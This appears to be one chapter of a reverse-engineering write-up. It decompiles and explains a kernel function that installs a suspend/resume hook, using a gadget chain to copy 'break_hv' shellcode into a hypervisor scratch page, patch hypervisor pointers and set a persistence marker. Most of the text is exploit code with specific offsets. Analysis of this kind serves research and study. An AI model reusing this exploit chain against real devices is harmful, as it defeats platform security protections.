# 03 — `install_resume_hook()`

Decompile:

```c
int install_resume_hook(void *core, uint64_t ksym9, uint64_t cr3) {
    kh_ctx_t ctx; kh_chain_t chain;
    uint8_t  buf[0x800];

    int rc = kh_init(&ctx, kread, kwrite, ktext(0), ksym9, /*slot*/ 0x6);
    if (rc) return rc;

    kh_set_tables(&ctx, kdlsym(0xA), kdlsym(0xB));
    kh_set_core  (&ctx, core);

    uint64_t scratch = kdldmap(0x3FFFF000);
    printf("[+] install_resume_hook: setting hook target = 0x%lx (base: 0x%lx), set rsi=0x%lx\n",
           kdlsym(0x6), ktext(0), scratch);

    kh_set_hook_target(&ctx, kdlsym(0x6));
    kh_set_resume_rsi (&ctx, scratch);
    kh_set_resume_rdx (&ctx, cr3);

    uint64_t ud = kh_user_data_addr(&ctx);

    kh_chain_init(&chain, buf, sizeof buf);

    /* Marker written to the user-data page, used later as the "cookie". */
    kh_chain_store (&chain, ud, 0xCAFE133741414141);

    /* gadget 0x6  — hook target enter                                   */
    kh_chain_g     (&chain, 0x6); kh_chain_q(&chain, cr3);
    /* gadget 0x3  — write user-data+8 marker                            */
    kh_chain_g     (&chain, 0x3); kh_chain_q(&chain, ud + 0x8);
    /* gadget 0xD  — flush                                               */
    kh_chain_g     (&chain, 0xD);

    /* Copy staged kernel shellcode into the HV-mapped scratch page.     */
    kh_chain_memcpy(&chain, kdldmap(0x3FFFF000), ksym9 + 0x1000, 0xF00);

    /* Patch HV-side pointers at well-known slots in the scratch page.   */
    kh_chain_store(&chain, kdldmap(0x3FFFFF00), kdlsym(0x7));
    kh_chain_store(&chain, kdldmap(0x3FFFFF08), kdldmap(0));
    kh_chain_store(&chain, kdldmap(0x3FFFFF10), ud);

    /* HV base PA — Pro vs Regular differ by 0x800000. */
    if (g_hv_base_pa == 0x8E0800000)
        kh_chain_store(&chain, kdldmap(0x3FFFFF18), g_hv_base_pa - 0x800000);
    else
        kh_chain_store(&chain, kdldmap(0x3FFFFF18), g_hv_base_pa);

    kh_chain_store(&chain, kdldmap(0x3FFFFF20), g_hv_base_pa + rawoff(0xC));
    kh_chain_store(&chain, kdldmap(0x3FFFFF28), g_hv_base_pa + rawoff(0xD));

    if ((rc = kh_install(&ctx, &chain))) return rc;
    kh_trigger(&ctx);

    /* Save prior state at ksym9+0x620..0x630 so uninstall can restore.  */
    kwrite64(ksym9 + 0x620, saved0);
    kwrite64(ksym9 + 0x628, saved1);
    kwrite64(ksym9 + 0x630, saved2);
    /* Arm persistence marker. */
    kwrite64(ksym9 + 0x600, 0x4B484F4F4B454401 /* "KHOOKED\x01" */);
    return 0;
}
```

### What this builds

A single-shot kernel hook that fires inside the suspend/resume codepath. The chain is a list of **generic gadgets** inside the HV (G-slots) interleaved with **memory operations** (store, memcpy). On resume:

1. HV enters the hooked target with CR3 == `cr3` captured from `kdlsym(0x8) + 0x28`.
2. Marker `0xCAFE133741414141` is deposited into user-data — read back as the "Cookie".
3. 0xF00 bytes of pre-staged `break_hv` shellcode are copied from `ksym9+0x1000` into the HV-accessible scratch at `kdldmap(0x3FFFF000)` and executed.
4. Fixed HV offsets `0x3FFFFF00..0x28` are patched with pointers the shellcode needs (HV base, HV sub-offsets `rawoff(0xC/0xD)`, kernel pointers).
5. Chain exits back to normal kernel flow — HV is now neutered.

### Pro vs Regular quirk

Pro's HV loader PA is `0x8E0800000`; the shellcode is told to subtract `0x800000` from that to find the "real" HV image offset. Regular (`0x62800000`) needs no shift.

### Persistence marker

`ksym9 + 0x600 = 0x4B484F4F4B454401`. If `main` is re-run and sees this value, it skips re-installation and goes straight to the resume-wait loop.
